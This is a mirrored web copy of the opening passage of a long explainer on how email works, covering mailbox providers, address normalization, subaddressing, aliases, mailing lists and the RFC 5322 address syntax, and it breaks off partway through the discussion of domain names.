<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://explained-from-first-principles.com/email/">Original</a>
    <h1>Email: Explained from First Principles</h1>
    
    <div id="readability-page-1" class="page"><div>
        <article>

<svg id="svg-definitions" width="0" height="0" viewBox="0 0 0 0" xmlns="http://www.w3.org/2000/svg">
    <defs>

        <marker id="arrow" orient="auto-start-reverse" markerWidth="4" markerHeight="4" refX="4" refY="2">
            <path d="M0,0 L1,2 L0,4 L4,2 Z"></path>
        </marker>
        <marker id="arrow-blue" orient="auto-start-reverse" markerWidth="4" markerHeight="4" refX="4" refY="2">
            <path d="M0,0 L1,2 L0,4 L4,2 Z"></path>
        </marker>
        <marker id="arrow-purple" orient="auto-start-reverse" markerWidth="4" markerHeight="4" refX="4" refY="2">
            <path d="M0,0 L1,2 L0,4 L4,2 Z"></path>
        </marker>
        <marker id="arrow-pink" orient="auto-start-reverse" markerWidth="4" markerHeight="4" refX="4" refY="2">
            <path d="M0,0 L1,2 L0,4 L4,2 Z"></path>
        </marker>
        <marker id="arrow-red" orient="auto-start-reverse" markerWidth="4" markerHeight="4" refX="4" refY="2">
            <path d="M0,0 L1,2 L0,4 L4,2 Z"></path>
        </marker>
        <marker id="arrow-orange" orient="auto-start-reverse" markerWidth="4" markerHeight="4" refX="4" refY="2">
            <path d="M0,0 L1,2 L0,4 L4,2 Z"></path>
        </marker>
        <marker id="arrow-yellow" orient="auto-start-reverse" markerWidth="4" markerHeight="4" refX="4" refY="2">
            <path d="M0,0 L1,2 L0,4 L4,2 Z"></path>
        </marker>
        <marker id="arrow-green" orient="auto-start-reverse" markerWidth="4" markerHeight="4" refX="4" refY="2">
            <path d="M0,0 L1,2 L0,4 L4,2 Z"></path>
        </marker>
        <marker id="arrow-brown" orient="auto-start-reverse" markerWidth="4" markerHeight="4" refX="4" refY="2">
            <path d="M0,0 L1,2 L0,4 L4,2 Z"></path>
        </marker>
        <marker id="arrow-gray" orient="auto-start-reverse" markerWidth="4" markerHeight="4" refX="4" refY="2">
            <path d="M0,0 L1,2 L0,4 L4,2 Z"></path>
        </marker>
        <marker id="arrow-text" orient="auto-start-reverse" markerWidth="4" markerHeight="4" refX="4" refY="2">
            <path d="M0,0 L1,2 L0,4 L4,2 Z"></path>
        </marker>
        <marker id="arrow-background" orient="auto-start-reverse" markerWidth="4" markerHeight="4" refX="4" refY="2">
            <path d="M0,0 L1,2 L0,4 L4,2 Z"></path>
        </marker>

        <marker id="circle" markerWidth="3" markerHeight="3" refX="1.5" refY="1.5">
            <circle cx="1.5" cy="1.5" r="1"></circle>
        </marker>
        <marker id="circle-blue" markerWidth="3" markerHeight="3" refX="1.5" refY="1.5">
            <circle cx="1.5" cy="1.5" r="1"></circle>
        </marker>
        <marker id="circle-purple" markerWidth="3" markerHeight="3" refX="1.5" refY="1.5">
            <circle cx="1.5" cy="1.5" r="1"></circle>
        </marker>
        <marker id="circle-pink" markerWidth="3" markerHeight="3" refX="1.5" refY="1.5">
            <circle cx="1.5" cy="1.5" r="1"></circle>
        </marker>
        <marker id="circle-red" markerWidth="3" markerHeight="3" refX="1.5" refY="1.5">
            <circle cx="1.5" cy="1.5" r="1"></circle>
        </marker>
        <marker id="circle-orange" markerWidth="3" markerHeight="3" refX="1.5" refY="1.5">
            <circle cx="1.5" cy="1.5" r="1"></circle>
        </marker>
        <marker id="circle-yellow" markerWidth="3" markerHeight="3" refX="1.5" refY="1.5">
            <circle cx="1.5" cy="1.5" r="1"></circle>
        </marker>
        <marker id="circle-green" markerWidth="3" markerHeight="3" refX="1.5" refY="1.5">
            <circle cx="1.5" cy="1.5" r="1"></circle>
        </marker>
        <marker id="circle-brown" markerWidth="3" markerHeight="3" refX="1.5" refY="1.5">
            <circle cx="1.5" cy="1.5" r="1"></circle>
        </marker>
        <marker id="circle-gray" markerWidth="3" markerHeight="3" refX="1.5" refY="1.5">
            <circle cx="1.5" cy="1.5" r="1"></circle>
        </marker>
        <marker id="circle-text" markerWidth="3" markerHeight="3" refX="1.5" refY="1.5">
            <circle cx="1.5" cy="1.5" r="1"></circle>
        </marker>
        <marker id="circle-background" markerWidth="3" markerHeight="3" refX="1.5" refY="1.5">
            <circle cx="1.5" cy="1.5" r="1"></circle>
        </marker>

    </defs>
</svg>

<header>
    
    <p>explained from first principles</p>

    <p>
        This <a href="https://github.com/KasparEtter/ef1p/blob/main/pages/email/email.md">article</a>
        and its <a href="https://github.com/KasparEtter/ef1p/blob/main/pages/email/email.tsx">code</a> were
        first published on  7 May 2021
        and <a href="https://github.com/KasparEtter/ef1p/commits/main/pages/email/email.md">last modified</a>
        on  9 December 2022.
        
        If you like the article,
        please share it with your friends on <a href="https://twitter.com/ExplainedFrom1P">social media</a>
        or support me with a <a href="https://evalapply.org/#donate">donation</a>.
        
        You can also
        join the <a href="https://www.reddit.com/r/ef1p/comments/n6ydf2/email_explained_from_first_principles/">discussion on Reddit</a>,
        <a id="pdf-download" href="https://evalapply.org/pages/email/generated/2022-12-09%20Email%20explained%20from%20first%20principles.pdf" download="">download the article</a> as a PDF,
        see what people are <a href="https://twitter.com/search?q=https%3A%2F%2Fexplained-from-first-principles.com%2Femail%2F%20-from%3AKasparEtter&amp;f=live">saying about it on Twitter</a>,
        or <a href="https://translate.google.com/translate?u=https://explained-from-first-principles.com/email/">use Google Translate</a> to read this article in your native language.
    </p>

    <p>
        If you are visiting this website for the first time,
        then please first read the <a href="https://evalapply.org/">front page</a>,
        where I explain the intention of this blog
        and how to best make use of it.
        As far as your privacy is concerned,
        all data entered on this page is stored locally in your browser
        unless noted otherwise.
        While I researched the content on this page thoroughly,
        you take or omit actions based on it at your own risk.
        In no event shall I as the author be liable
        for any damages arising from information or advice
        on this website or on referenced websites.
    </p>
</header>

<details open="">
  <summary id="preface">
Preface
</summary>

  <p>Being one of the oldest services on the Internet,
email has been with us for decades and will remain with us for at least another decade.
Even though email plays an important role in everyday life, most people know very little about how it works.
Before we roll up our sleeves and change this, here are a few things that you should know:</p>
  <ul>
    <li>This article covers all aspects of modern email.
As a result, it became really long.
While later chapters do build on earlier ones,
you can start reading wherever you want and fill your knowledge gaps as you go.</li>
    <li>This article is structured as follows:
After clarifying some user-facing <a href="#concepts">concepts</a>,
we’ll look at the technical <a href="#architecture">architecture</a> of email
and the roles of the various <a href="#entities">entities</a>.
We’ll then study the <a href="#protocols">protocols</a> used by these entities to communicate with one another
and the <a href="#format">format</a> of the transmitted messages.
Once we understand how email works,
we can discuss its <a href="#privacy">privacy</a> and <a href="#security">security</a> <a href="#issues">issues</a>
and examine how some of the security issues are being <a href="#fixes">fixed</a> by more recent standards.</li>
    <li>Among many other things, you will learn in this article
<a href="#why-outgoing-mail-servers">why mail clients use outgoing mail servers</a>,
<a href="#submission-versus-relay">why <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> is used for the submission and the relay of messages</a>,
<a href="#mail-loops">how mail loops are prevented</a>,
and <a href="#domain-authentication">how you should configure your custom domains</a>.</li>
    <li>Even if you’re not interested in email, this article can teach you a lot about Internet protocols and <abbr title="Information Technology">IT</abbr> security.
For example, it covers <a href="#use-of-tls">Implicit and Explicit <abbr title="Transport Layer Security">TLS</abbr></a>;
<a href="#password-based-authentication-mechanisms">password-based authentication mechanisms</a>
with <a href="#cryptographic-hash-functions">hash functions</a>, <a href="#nonces-against-replay-attacks">replay attacks</a>,
<a href="#exclusive-or-operation-for-perfect-encryption">encryption mechanisms</a>, and <a href="#tls-channel-bindings">channel bindings</a>;
<a href="#internationalized-domain-names">internationalized domain names</a> with <a href="#punycode-encoding">Punycode encoding</a>,
<a href="#unicode-normalization">Unicode normalization</a>, <a href="#unicode-case-folding">case folding</a>,
and <a href="#homograph-attack">homograph attacks</a>; <a href="#transport-security">transport security</a>
with <a href="#dns-based-authentication-of-named-entities"><abbr title="DNS-Based Authentication of Named Entities">DANE</abbr></a> and <a href="#http-strict-transport-security"><abbr title="HTTP Strict Transport Security">HSTS</abbr></a>;
and <a href="#end-to-end-security">end-to-end security</a> with <a href="#comparison-of-smime-and-pgp"><abbr title="Secure/Multipurpose Internet Mail Extensions">S/MIME</abbr> and <abbr title="Pretty Good Privacy">PGP</abbr></a>.</li>
    <li>If you haven’t done so already, read the <a href="https://evalapply.org/internet/">article about the Internet</a> first.
This article assumes that you’re familiar with the following acronyms and the concepts behind them:
<a href="https://evalapply.org/internet/#request-for-comments"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr></a>, <a href="https://evalapply.org/internet/#network-layer"><abbr title="Internet Protocol">IP</abbr></a>,
<a href="https://evalapply.org/internet/#transmission-control-protocol"><abbr title="Transmission Control Protocol">TCP</abbr></a>, <a href="https://evalapply.org/internet/#transport-layer-security"><abbr title="Transport Layer Security">TLS</abbr></a>,
<a href="https://evalapply.org/internet/#domain-name-system"><abbr title="Domain Name System">DNS</abbr></a>, and <a href="https://evalapply.org/internet/#domain-name-system-security-extensions"><abbr title="Domain Name System Security Extensions">DNSSEC</abbr></a>.</li>
    <li>This article contains 29 tools.
To make it easier to play around with them, I’ve published them on a <a href="https://evalapply.org/email/tools/">separate page</a> as well.</li>
    <li>This article focuses on how modern email works, not on how you set up your own email infrastructure.
If you want to do that, <a href="https://mailinabox.email/">Mail-in-a-Box</a> seems like a good place to start.</li>
    <li>During my research for this article,
I made <a href="https://en.wikipedia.org/wiki/Responsible_disclosure">responsible disclosures</a>
to <a href="#spoofed-sender-during-submission">Gandi</a>, <a href="#outlook.com-example-exploit">Microsoft</a>,
<a href="#origination-date">and</a> <a href="#sender-towards-recipients">Mozilla</a> <a href="#thunderbird-example-exploit">Thunderbird</a>.
I also submitted <a href="https://www.rfc-editor.org/errata_search.php?submitter_name=Kaspar+Etter">quite a few <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> errata</a>.</li>
  </ul>

</details>

<details>
  <summary id="impact">
Impact
</summary>

  <p>This article had the following impact in the email industry (beyond <a href="#fixes">additional <abbr title="Domain Name System">DNS</abbr> records</a>):</p>
  <ul>
    <li>The mail client <a href="https://en.wikipedia.org/wiki/Mutt_(email_client)">Mutt</a> gained an option to
<a href="https://gitlab.com/muttmua/mutt/-/commit/4c786d8795fa55eca3685d58edc60361ddf4de37">conceal the sender’s time zone</a>
for <a href="#sender-towards-recipients">more privacy</a>.</li>
    <li><a href="https://en.wikipedia.org/wiki/Mail-in-a-Box">Mail-in-a-Box</a> added <a href="#null-mx-record">null <code>MX</code> records</a>
for <a href="https://github.com/mail-in-a-box/mailinabox/commit/e283a1204728024c3e0cf77fdb5292fbdecde85f">subdomains with address records</a>.</li>
    <li><a href="https://www.gandi.net/en-US/domain/email">Gandi.net</a> no longer includes
the <a href="#sender-towards-recipients">sender’s <abbr title="Internet Protocol">IP</abbr> address</a> in sent messages.</li>
  </ul>

  <p>If you made changes in your software project because of this article,
<a href="mailto:contact@ef1p.com">let me know</a> so that I can add your change to the list above.</p>

</details>

<details>
  <summary id="terminology">
Terminology
</summary>

  <p><a href="https://en.wikipedia.org/wiki/Email">Email</a>, which also used to be written as e-mail, stands for electronic mail.
Since the term <em>electronic mail</em> applies to any mail that is transferred electronically, it also encompasses
<a href="https://en.wikipedia.org/wiki/Fax">fax</a>, <a href="https://en.wikipedia.org/wiki/SMS"><abbr title="Short Message Service">SMS</abbr></a>, and other systems.
For this reason, I use only the short form <em>email</em> in this article and always mean the decentralized system
to transfer messages over the Internet as documented in numerous <a href="https://evalapply.org/internet/#request-for-comments"><abbr title="Requests for Comments, published by the Internet Engineering Task Force (IETF)">RFCs</abbr></a>.
The term <em>email</em> doesn’t appear in the <a href="https://datatracker.ietf.org/doc/html/rfc821">original <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr></a>,
and many <abbr title="Requests for Comments, published by the Internet Engineering Task Force (IETF)">RFCs</abbr> just use <em>mail</em> or <em>(Internet) message</em> instead.
In ordinary language, <em>email</em> refers both to the system of standards
and to individual messages transmitted via these standards.
While the English language would allow us to distinguish between the two usages
by capitalizing the former but not the latter, I’ve never seen anyone doing this.
Even though I’m tempted to pioneer the proper use of grammar here,
I’d rather save my <a href="https://en.wikipedia.org/wiki/Artistic_license">artistic license</a> for other things.
(<a href="https://en.wikipedia.org/wiki/Proper_noun_and_common_noun">Proper nouns</a> refer to a single entity,
whereas common nouns refer to a class of entities.
Only proper nouns are capitalized in English.
For example, <em>Earth</em> with a capital E refers to the planet we live on,
whereas <em>earth</em> with a lowercase E refers to the soil in which plants grow.)
Note that this is in contrast to <a href="https://en.wikipedia.org/wiki/Capitalization_of_Internet"><em>Internet</em></a>,
which is commonly capitalized because there is only one Internet:
You’re either connected to <em>the</em> Internet or not.
Unfortunately, the Internet becomes increasingly fragmented along country borders
due to legal reasons, such as copyright licenses,
and political reasons, such as censorship.
Therefore, we might have to degrade <em>Internet</em> to a common noun soon.</p>

</details>

<h2 id="concepts">Concepts</h2>

<p>Before diving into the technical aspects of email, let’s first look at email from the perspective of its users.</p>

<h3 id="message">Message</h3>

<p>The purpose of email is to send messages over the Internet.
A message is a recorded piece of information which is delivered asynchronously from a sender to one or several recipients.
<a href="https://en.wikipedia.org/wiki/Asynchronous_communication#Electronically_mediated_communication">Asynchronous communication</a>
means that a message can be consumed at an arbitrary point after it has been produced,
rather than having to interact with the sender concurrently.
A message can be transmitted with a physical object, such as a letter,
or with a physical signal, such as an acoustic or electromagnetic wave.
While humans have delivered messages in the form of objects for millennia
with <a href="https://en.wikipedia.org/wiki/Courier">couriers</a> and <a href="https://en.wikipedia.org/wiki/Homing_pigeon">pigeons</a>,
it’s only since the invention of the <a href="https://en.wikipedia.org/wiki/Optical_telegraph">optical telegraph</a>
in the late 18th century and the invention of the <a href="https://en.wikipedia.org/wiki/Electrical_telegraph">electrical telegraph</a>
in the middle of the 19th century that we can signal arbitrary messages over long distances.
The fundamental principle of communication stayed the same over all those years:
You can either start a new conversation or continue an existing one by replying to a previous message.</p>

<h3 id="mailbox">Mailbox</h3>

<p>A <a href="https://en.wikipedia.org/wiki/Email_box">mailbox</a> is a box for incoming mail (also called an inbox),
into which everyone can deposit messages but ideally only the intended recipient can retrieve them.
In some countries, the privacy of such messages is legally protected by the
<a href="https://en.wikipedia.org/wiki/Secrecy_of_correspondence">secrecy of correspondence</a>.</p>

<h3 id="provider">Provider</h3>

<p>There are three things that set email apart from the
<a href="https://en.wikipedia.org/wiki/Mail">traditional postal system</a>,
which is sometimes also referred to as snail mail:</p>
<ol>
  <li>Email conveys <a href="https://en.wikipedia.org/wiki/Digital_data">digital data</a>,
whereas a letter is a physical item.
The former is much more useful for further processing.</li>
  <li>Email enables instant global delivery at a <a href="https://en.wikipedia.org/wiki/Marginal_cost">marginal cost</a> of zero.
The only fee you pay is for your access to the Internet.</li>
  <li>Mailboxes for email are provided and operated by companies,
which are called <a href="https://en.wikipedia.org/wiki/Mailbox_provider">mailbox providers</a>.
While you could operate your own server since email is an open and decentralized system,
this is rarely done in practice for reasons we discuss <a href="#reputation">later on</a>.</li>
</ol>

<p><strong>Terminology</strong>: Earlier versions of this article used the term
<a href="https://en.wikipedia.org/wiki/Email_service_provider_(marketing)">email service provider (<abbr title="Email Service Provider">ESP</abbr>)</a>
instead of <a href="https://en.wikipedia.org/wiki/Mailbox_provider">mailbox provider</a>.
Since the former term is also used to refer to <a href="#reputation">email delivery vendors</a>,
I decided to replace it with the latter term.
Somewhat confusingly, <a href="https://datatracker.ietf.org/doc/html/rfc5598#section-2.3">mail service provider (<abbr title="Mail Service Provider">MSP</abbr>)</a>
is a synonym for mailbox provider even though mail and email are used interchangeably in the context of email.</p>

<details>
  <summary id="popular-mailbox-providers">
Which are the most popular mailbox providers?
</summary>

  <p><em>Please treat all the numbers in this box with caution.
They were surprisingly hard to come by, with the sources being scattered and not necessarily trustworthy.
Additionally, the numbers were reported in different years,
which distorts the market share of these companies.</em></p>

  <p>It is <a href="https://financesonline.com/number-of-email-users/">estimated</a>
that around half of the human population uses email,
with an average of 1.75 active accounts per user.
In the Western world, the consumer market is dominated by <a href="https://en.wikipedia.org/wiki/Google">Google</a>
with their <a href="https://en.wikipedia.org/wiki/Gmail">Gmail</a> service, which has 1.5 billion active users.
In China, the biggest player is <a href="https://en.wikipedia.org/wiki/Tencent_QQ">Tencent QQ</a> with 900 million active accounts.
<a href="https://en.wikipedia.org/wiki/Outlook.com">Outlook</a> by <a href="https://en.wikipedia.org/wiki/Microsoft">Microsoft</a>
has 400 million active users,
which is followed by <a href="https://en.wikipedia.org/wiki/Yahoo!_Mail">Yahoo! Mail</a> with 225 million active users.
<a href="https://en.wikipedia.org/wiki/Apple_Inc.">Apple</a>’s <a href="https://en.wikipedia.org/wiki/ICloud">iCloud</a> has 850 million users,
but it’s not known how many of those use its email functionality.</p>

</details>

<h3 id="address">Address</h3>

<p><a href="https://en.wikipedia.org/wiki/Email_address">Email addresses</a>
are used to identify the sender and the recipient(s) of a message.
They consist of a username followed by the <a href="#the-@-symbol">@ symbol</a> and a domain name.
The domain name allows the sender to first <a href="#address-resolution">determine</a>
and then <a href="#simple-mail-transfer-protocol">connect</a> to the mail server of each recipient.
The username allows the mail server to determine the mailbox to which a message should be delivered.
The hierarchical <a href="https://evalapply.org/internet/#domain-name-system">Domain Name System</a> ensures that the domain name is unique,
whereas the mailbox provider has to ensure that the name of each user is unique within its domain.
There doesn’t have to be a one-to-one correspondence between addresses and mailboxes:
A mailbox can be identified <a href="#subaddressing">by several addresses</a>,
and an email sent to a single address can be delivered <a href="#alias-address">to multiple mailboxes</a>.</p>

<details>
  <summary id="display-name">
Display name
</summary>

  <p>Email protocols accept an optional display name in most places where an email address is expected.
The format for this is <code>Display Name &lt;user@example.com&gt;</code>
according to <a href="https://datatracker.ietf.org/doc/html/rfc5322#section-3.4"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5322</a>.
Mail clients display this name to the user as follows:</p>

  <figure>
    <p><img src="https://evalapply.org/pages/email/generated/apple-mail-display-name.light.png"/>
<img src="https://evalapply.org/pages/email/generated/apple-mail-display-name.dark.png"/>
    

</p>

    <figcaption>How <a href="https://en.wikipedia.org/wiki/Apple_Mail">Apple Mail</a> shows the display name in the <a href="#recipients"><code>To</code></a> and <a href="#sender"><code>From</code></a> fields – if you have <a href="https://support.apple.com/guide/mail/use-smart-addresses-mlhl0257dcd6/mac">Smart Addresses</a> disabled, which you totally should.</figcaption>

  </figure>

  <p>This feature seems totally benign, but, as we will see later on,
it has serious <a href="#sender-towards-recipients">privacy</a> and <a href="#malicious-display-names">security</a> implications.</p>

</details>

<details>
  <summary id="the-@-symbol">
The @ symbol
</summary>

  <p>While most of us know the <a href="https://en.wikipedia.org/wiki/At_sign">@ symbol</a>
exclusively from email addresses and social media to tag another user,
it has been used for centuries in commerce.
In Spanish and Portuguese, it denoted a <a href="https://en.wikipedia.org/wiki/Arroba">custom unit of weight</a>.
In English, it came to mean <em>at the rate of</em> similar to the French <em>à</em>.
The @ symbol was already included in the first edition of the <a href="https://evalapply.org/internet/#text-encoding"><abbr title="American Standard Code for Information Interchange">ASCII</abbr> character set</a> in 1963,
years before the symbol was first used to designate the <a href="https://en.wikipedia.org/wiki/Host_(network)">network host</a>
in a predecessor of today’s email in 1971.</p>

</details>

<details>
  <summary id="normalization">
Normalization
</summary>

  <p>In <a href="https://datatracker.ietf.org/doc/html/rfc5322#section-3.4.1">the standard</a>, the part before the @ symbol
is called the <a href="https://en.wikipedia.org/wiki/Email_address#Local-part">local part</a> of an email address.
The interpretation of the local part is completely up to the receiving mail system specified after the @ symbol
and you shouldn’t make any assumptions about the recipient’s address as a sender.
In particular, implementations <a href="https://datatracker.ietf.org/doc/html/rfc5321#section-2.4">must preserve the case</a>
of the letters in the local part, but mail servers are encouraged to deliver messages case-independently.
In other words, it is recommended but not mandatory
that mail servers treat <code>John.Smith</code> and <code>john.smith</code> as the same user.
Some mailbox providers go further than this:
Gmail, for example, <a href="https://support.google.com/mail/answer/10313">removes all dots</a>
from the local part of an address when determining the mailbox to deliver a message to.
This means that emails addressed to <code>john.smith@gmail.com</code> and <code>johnsmith@gmail.com</code>
are received by the same user – who also gets all messages for <code>j.o.h.n.s.m.i.t.h@gmail.com</code>.
The process of transforming data to its canonical form
is called <a href="https://en.wikipedia.org/wiki/Canonical_form#Computing">normalization</a>.</p>

</details>

<details>
  <summary id="subaddressing">
Subaddressing
</summary>

  <p>Many mailbox providers support a technique known as
<a href="https://en.wikipedia.org/wiki/Email_address#Subaddressing">subaddressing</a> as part of their address normalization.
By restricting the character set for usernames more than the standard demands,
a mailbox provider can designate a special character,
which is valid according to the standard but not in its set for usernames,
to split the <a href="#normalization">local part</a> into two.
The part before this special character is used to determine the recipient of a message.
The part after this special character is a tag that the user can choose when they share their address.
Since subaddressing can be implemented by the receiving mail system at will, it has never been formalized
beyond <a href="https://datatracker.ietf.org/doc/html/draft-newman-email-subaddr-01">this draft</a> from 2007.
<a href="https://gmail.googleblog.com/2008/03/2-hidden-ways-to-get-more-from-your.html">Gmail</a> and
<a href="https://docs.microsoft.com/en-us/exchange/recipients-in-exchange-online/plus-addressing-in-exchange-online">Microsoft Exchange</a>
support subaddressing with a plus.
For example, emails to <code>user+tag@gmail.com</code> are delivered to <code>user@gmail.com</code>.</p>

  <p>If you reply to an email that you received at a subaddress with a plus,
Gmail still uses your main address in the <code>From</code> field, unfortunately.
In order to send emails (including replies) from a subaddress,
you have to add it <a href="https://support.google.com/mail/answer/22370">in the settings</a>:</p>

  <figure>
    <p><img src="https://evalapply.org/pages/email/generated/gmail-send-mail-as.png"/>
    

</p>

    <figcaption>Go to the <a href="https://mail.google.com/mail/u/0/#settings/accounts">Accounts and Import</a> tab of your settings and click on “Add another email address” under “Send mail as”.</figcaption>

  </figure>

  <figure>
    <p><img src="https://evalapply.org/pages/email/generated/gmail-add-another-address.png"/>
    

</p>

    <figcaption>Afterwards, enter the preferred <a href="#display-name">display name</a> and subaddress in the new window. You can leave the box <a href="https://support.google.com/a/answer/1710338">“Treat as an alias”</a> checked.</figcaption>

  </figure>

  <p>Subaddressing can be useful to filter incoming emails based on their context.
Instead of creating several accounts,
you can separate different areas of your life with the convenience of having just a single account.
Subaddressing also allows you to track whether a company passed your email address on.
When you no longer want to receive emails from a company and its affiliates,
you can simply block all emails sent to the address variant you gave them.
While subaddressing can be used for creating
<a href="https://en.wikipedia.org/wiki/Disposable_email_address">disposable email addresses</a> on the fly,
this protection against abuse can easily be circumvented.
If the subaddressing scheme is publicly known, spammers can just remove the tag from customized addresses.
A better method against unsolicited messages is to create proper <a href="#alias-address">email aliases or forwarding addresses</a>,
which are indistinguishable from ordinary addresses.
The disadvantage of this approach is that you have to set them up before you can use them.
If you use a custom domain for your emails, you might be able to use a so-called catch-all address
or customize the subaddressing scheme by using <a href="https://en.wikipedia.org/wiki/Wildcard_character">wildcards</a>.</p>

</details>

<details>
  <summary id="alias-address">
Alias address
</summary>

  <p>An <a href="https://en.wikipedia.org/wiki/Email_alias">alias address</a>
doesn’t have a <a href="#mailbox">mailbox</a> associated with it but simply
<a href="https://en.wikipedia.org/wiki/Email_forwarding">forwards</a> all incoming messages to one or several addresses.
The forwarding is done by the <a href="#incoming-mail-server">incoming mail server</a> of the alias address
and the expanded addresses may belong to the same or to different hosts.
Unlike in the case of a <a href="#mailing-list">mailing list</a>,
an <a href="#automatic-responses">automatic response</a> by a recipient is sent to the original sender.
Alias addresses can forward messages to other alias addresses, which can cause <a href="#mail-loops">mail loops</a>.</p>

</details>

<details>
  <summary id="mailing-list">
Mailing list
</summary>

  <p>A <a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">mailing list</a>
is an address which forwards incoming messages to all the subscribers of the list.
The administrator of the list can decide who is allowed to send messages to the list
and whether each message needs to be approved by a moderator before it is forwarded.
Unlike in the case of an <a href="#alias-address">alias address</a>,
the mailing list software has to change the <a href="#diverging-envelope-example">envelope of the message</a>
so that <a href="#automatic-responses">automatic responses</a> from subscribers of the list
are sent to the administrator of the list rather than the original sender.</p>

</details>

<details>
  <summary id="address-syntax">
Address syntax
</summary>

  <p>When is an email address valid?
As with many technical standards, the answer to this question looks straightforward at first.
But as soon as you dig a bit deeper, the answer becomes complicated and messy.
What standards allow is often much more than what is widely accepted and used:</p>

  <figure>
    <svg id="figure-standards-allowed-used" data-name="standards-allowed-used" width="505.20799999999997" height="102.5" viewBox="-238.676 -51.25 505.20799999999997 102.5" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <circle cx="0" cy="0" r="50"></circle>
    <text text-anchor="start">
        <tspan x="-237.426" y="5.9">What a standard allows</tspan>
    </text>
    <circle cx="40" cy="0" r="20"></circle>
    <text text-anchor="end">
        <tspan x="265.282" y="5.9">What is actually being used</tspan>
    </text>

</svg>

    <figcaption>
Often only a subset of a standard finds adoption,
while some things become convention without a formal standard.
</figcaption>
  </figure>

  <p>The syntax of email addresses is specified in
<a href="https://datatracker.ietf.org/doc/html/rfc5322#section-3.4.1">section 3.4.1 of <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5322</a>.
As mentioned earlier, an address consists of a local part followed by the @ symbol and a domain name.
If we restrict ourselves to what is widely adopted, the local part has to consist of the characters
<code>a</code> to <code>z</code>, <code>A</code> to <code>Z</code>, <code>0</code> to <code>9</code>, and any of <code>!#$%&amp;&#39;*+-/=?^_`{|}~</code>.
A dot <code>.</code> can be used as long as it is between two of the aforementioned characters.
In other words, you cannot have multiple dots in a row or at the beginning or end of the local part.
The local part has to consist of at least one character,
and every mail system must be able to handle addresses whose local part is up to
<a href="https://datatracker.ietf.org/doc/html/rfc5321#section-4.5.3.1.1">64 characters long</a>, including any dots.
While this is the easy part of the standard, you should avoid most of the special characters
if you want to be confident that online services accept your email address.
<a href="https://twitter.com/">Twitter</a>, for example, accepts only <code>!+-_</code> beyond the alphanumeric characters and the dot.
This allows me to sign up with an address such as <code>!+-_@ef1p.com</code>.
<a href="https://gmail.com/">Gmail</a>, on the other hand, accepts <code>!#$%&amp;&#39;*+-/=?^_`{|}~@ef1p.com</code> as a recipient
but fails to recognize this character sequence as an email address in text.</p>

  <p>This paragraph is about the complicated part of the standard,
which is not widely supported and therefore more of theoretical than practical interest.
The local part of an email address can also be a <a href="https://datatracker.ietf.org/doc/html/rfc5322#section-3.2.4">quoted string</a>.
Any <a href="https://en.wikipedia.org/wiki/ASCII#Printable_characters">printable <abbr title="American Standard Code for Information Interchange">ASCII</abbr> character</a>
is allowed inside of double quotes.
If we ignore the <a href="https://datatracker.ietf.org/doc/html/rfc5322#section-4.4">obsolete syntax</a>,
which may no longer be generated but must still be accepted,
the quoted string has to be the whole local part,
i.e. it cannot be combined with non-quoted characters.
Both <code>&#34;@&#34;@ef1p.com</code> and <code>&#34;..&#34;@ef1p.com</code> are valid addresses,
and so is <code>&#34;&#34;@ef1p.com</code> (<a href="https://www.rfc-editor.org/errata/eid3135">at least for now</a>).
Only <code>&#34;</code> and <code>\</code> need to be escaped with a backslash in front of them.
This means that <code>&#34;\&#34;&#34;@ef1p.com</code> and <code>&#34;\\&#34;@ef1p.com</code> are also valid addresses.
When it comes to <a href="https://en.wikipedia.org/wiki/Whitespace_character">whitespace characters</a>,
such as space and tab, the situation is a bit confusing.
A quoted string can contain escaped spaces (<code>&#34;\ &#34;</code>)
through the <a href="https://datatracker.ietf.org/doc/html/rfc5322#section-3.2.1"><code>quoted-pair</code> rule</a>.
The only other way a space can be added to a quoted string
is as <a href="https://datatracker.ietf.org/doc/html/rfc5322#section-3.2.2">folding whitespace</a>.
The standard says that runs of folding whitespace
which occur between lexical tokens in a structured header field
are semantically interpreted as a single space character.
My understanding of this is
that a local part with several unescaped spaces (<code>&#34;  &#34;</code>)
is the same as a local part with a single space (<code>&#34; &#34;</code>).
It’s not clear to me, though, whether <code>&#34; &#34;</code> is to be interpreted as <code>&#34;&#34;</code>.
I think this might be the case
because spaces are clearly excluded from the set of characters which don’t need to be escaped.
The <a href="https://datatracker.ietf.org/doc/html/rfc5322#page-14"><code>qtext</code> rule</a>
doesn’t include the space character, which is <code>%d32</code> in <abbr title="American Standard Code for Information Interchange">ASCII</abbr>,
but this <a href="https://www.rfc-editor.org/errata/eid4692">might change</a> in the future.
If unescaped spaces were meant to have meaning beyond just folding lines,
which we’ll discuss <a href="#line-length-limit">later</a>,
they could easily have been added to the <code>qtext</code> rule.
On the other hand,
the equivalent <code>qtextSMTP</code> rule of <a href="https://datatracker.ietf.org/doc/html/rfc5321#section-4.1.2"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5321</a> does allow spaces.
What the standard does clarify is that the escape character <code>\</code> is semantically invisible.
Therefore, <code>&#34;a&#34;</code> and <code>&#34;\a&#34;</code> are equivalent.
I assume this means that mail systems are allowed to remove the backslash in front of characters
which don’t need to be escaped in non-local addresses.</p>

  <p>What about the domain part of an email address?
While the <a href="https://evalapply.org/internet/#domain-name-system">Domain Name System</a> allows the use of pretty much any character,
the <a href="https://datatracker.ietf.org/doc/html/rfc1035#section-2.3.1">preferred name syntax</a>
requires that each <a href="https://en.wikipedia.org/wiki/Domain_name#Domain_name_syntax">label</a>
consists only of letters, digits, and hyphens, where labels may neither start nor end with a hyphen.
